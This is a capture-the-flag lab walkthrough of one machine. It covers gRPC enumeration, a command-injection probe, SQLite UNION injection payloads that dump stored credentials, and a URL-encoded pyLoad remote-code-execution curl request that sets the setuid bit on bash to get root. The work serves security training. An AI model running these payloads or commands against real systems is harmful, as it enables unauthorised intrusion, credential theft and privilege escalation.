### IP
`10.10.11.214`

# Reconnaissance

### nmap

`sudo nmap -sC -sV `
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93%I=7%D=5/27%Time=6471C184%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0
SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Generic
SF:Lines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetRe
SF:quest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPO
SF:ptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSP
SF:Request,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPC
SF:Check,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVe
SF:rsionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\
SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0
SF:")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0
SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\
SF:0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0
SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\
SF:0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0
SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0
SF:\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?
SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0
SF:8\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Based on some of the fingerprint strings ("DNSStatusRequestTCP", "Kerberos", "SMBProgNeg", "X11Probe") and the port of 50051, this looks like it is a gRPC app.
	When we try to connect with `nc 10.10.11.214 50051` we get some binary data back and not much else

# Exploitation

### grpc

I tried a couple terminal-based tools for interacting with gRPC, but none of them were nearly as easy as [grpcui]

We need to use the `plaintext` switch since the traffic isn't over tls. 

`grpcui -plaintext 10.10.11.214:50051`

Once we're connected, we can see a service called SimpleApp that has three methods:
	- getInfo
	- LoginUser
	- CreateUser


We can create a user with any credentials and then we can send a request to LoginUser with the new credentials, which gives us an id and a jwt as a response.

When we send that ID to getInfo, it asks for a token, so we can simply provide the one it gave us for that ID. We get the following:

```json
{
  "message": "Will update soon."
}
```

From here, I tried to check for command injeciton by changing the id field to:

```bash
884 ; ping 10.10.14.67
```

I didn't get a response, but I did get the following error:

```python
Unexpected <class 'sqlite3.Warning'>: You can only execute one statement at a time.
```

From this, we know that gRPC is querying an sqlite database in the back, so we can try SQL injection.



### SQL injection

Almost all of my payloads were based on [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) PayloadAllTheThings cheatsheet.

I tried variations of including/excluding a single quote and a comment at the end of the query.

The following are payloads and responses that worked for me (in the order that I used them):


```sql
884 union select group_concat(sqlite_version())
```
```json
{
  "message": "3.31.1"
}
```

```sql
884 union select group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite%'
```
```json
{
  "message": "accounts,messages"
}
```

```sql
884 union select sql from sqlite_master where type!='meta' and sql not null and name='accounts'
```

```json
{
  "message": "CREATE TABLE \"accounts\" (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)"
}
```

```sql
884 union select group_concat(username) from accounts
```

```json
{
  "message": "admin,sau"
}
```


```sql
884 union select password from accounts where username='sau'
```
```
{
  "message": "HereIsYourPassWord1431"
}
```

# SSH

`ssh sau@10.10.11.214`

We can ssh in with the credentials we found in the database and we get the user flag.

# Privilege Escalation

Interestingly, if we run `ss -ntlp`, we can see a website listening on port 8000 and is running as root, but is only accessible by localhost.

To make it easier for us to view the website, we can port-forward it over to us:

```bash
ssh -L 8000:localhost:8000 sau@10.10.11.214
```

It seems that a website called `pyload` is running on port 8000 which, upon some research, seems to have an unauthenticated remote code execution vulnerability present. 

POC [here](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)

The original payload is shown below and maked a file called `/tmp/pwned` as a proof-of-concept.
```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
    --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```

We can modify the script to make it run `chmod +s /bin/bash` which will make it very easy for us to escalate privileges. I chose this, as it has far fewer characters than reverse shells and similar. 

To modify the payload we have to:
1. url-decode the original payload
2. replace their command with ours
3. url-encode **every** character. online tool [here](https://onlinetexttools.com/url-encode-text)
4. make sure to remove or update the `Content-Length` header from the original POC
5. send the new payload

```bash
curl -i -s -k -X $'POST'     -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded'  --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6D%70%6F%72%74%20%6F%73%3B%6F%73%2E%73%79%73%74%65%6D%28%22%63%68%6D%6F%64%20%2B%73%20%2F%62%69%6E%2F%62%61%73%68%22%29;f=function%20f2(){};&passwords=aaaa'     $'http://127.0.0.1:8000/flash/addcrypted2'
```

This command responds with a 500 code, but we can see that the permissions of bash have changed.

We can now run `bash -p` to get a root shell and get the root flag.
